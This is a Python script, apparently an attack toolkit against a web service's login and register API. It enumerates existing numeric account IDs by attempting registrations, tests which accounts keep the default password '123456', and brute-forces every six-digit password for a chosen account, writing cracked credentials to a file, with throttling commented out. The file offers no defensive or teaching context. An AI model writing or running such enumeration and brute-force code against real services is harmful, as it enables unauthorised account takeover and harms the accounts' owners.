import requests
import time

class EAW_ToolKit:
    
    def __init__(self, host):
        self.host = host
        self.defaultPassword = '123456'
    
    def _login(self, account, password):
        path='/api/v1/login'
        gzip='gzip'
        lang='ZH'
        res = requests.post(self.host+path,data={
            'account': account,
            'password': password,
            'gzip': gzip,
            'lang': lang
        })
        return res

    def _register(self, account, password):
        path='/api/v1/register'

        phone=password
        gzip='gzip'
        lang='ZH'
        return requests.post(self.host+path, data={
            'account': account,
            'password': password,
            'gzip': gzip,
            'lang': lang
        })

    # Find account whose password is not 123456
    def findTargetAccount(self):
        defaultPassword='123456'
        existingFile = open('existing.txt','r')
        targetAccountsFile= open('target.txt', 'a')
        accountLines=existingFile.readlines()
        print (accountLines)
        for line in accountLines:
            account = line.strip()
            response=self._login(account, defaultPassword)
            contentJson=response.json()
            print ('Login response:' + account, contentJson['code'], contentJson['message'])
            if contentJson['code'] == 0:
                print ('Login default password succeeded for '+ account)
            else:
                print ('Saving account whose password is not default:'+ account)
                targetAccountsFile.write(account)
                targetAccountsFile.write('\n')


    # register from 0 - 9999
    def registerRange(self, begin, end):
        init_number=begin
        maximum=end
        password='123456'
        existing_account=[]
        existing_file=open('existing.txt','a')
        while init_number < maximum:
            account=str(init_number)
            print ('Regesting account:'+ account)
            init_number += 1
            response = self._register(account, password)
            try:
                contentJson = response.json()
            except ValueError:
                print ('Failed to pass JSON:'+ account+':'+password, response.content)
                continue
            print (contentJson['code'], contentJson['message'])
            if contentJson['code'] == 0:
                print ('Register account succeeded:' + account)
            else: 
                print ('Save existing account:' + account)
                existing_account.append(account)
                existing_file.write(account)
                existing_file.write("\n")
            # time.sleep(0.1)
            init_number += 1


    # brute force try password 6 digits password 100000 - 999999
    def bruteForceLogin(self, account):
        start=100000
        maximum = 999999
        targetPwdFile= open('target-pwd.txt', 'a')
        while start < maximum:
            password = str(start)
            response = self._login(account, password)
            try:
                contentJson = response.json()
            except ValueError:
                print ('Failed to pass JSON:'+ account+':'+password, response.content)
                continue
            
            print ('Login response:' + account+':'+password, contentJson['code'], contentJson['message'])
            if contentJson['code'] == 0 :
                print ('Password succeeded:'+ password)
                targetPwdFile.write(account+':'+password)
                targetPwdFile.write('\n')
            # time.sleep(0.01)
            start += 1
        print ('No password found')


    